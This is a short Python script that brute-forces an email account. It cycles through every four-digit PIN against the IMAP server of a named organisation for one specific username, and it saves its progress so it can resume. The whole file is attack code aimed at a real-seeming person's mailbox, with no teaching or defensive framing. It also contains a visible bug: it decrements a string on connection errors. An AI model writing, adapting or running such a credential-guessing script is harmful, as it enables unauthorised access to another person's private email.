#!/usr/bin/env python
import imaplib, socket
try:
    lasttry=int(open("lasttry.txt").read())
except IOError:
    lasttry=0
server=imaplib.IMAP4_SSL("mail.bcp.org")
for i in range(lasttry,10000):
    pw=str(i).zfill(4)
    try:
        server.login("nick.eyre11",pw)
        print pw+" successful!"
        break
    except server.error:
        print pw+" failed"
    except socket.error:
        server=imaplib.IMAP4_SSL("mail.bcp.org")
        pw-=1
    f=open("lasttry.txt",'w')
    f.write(pw)
    f.close()
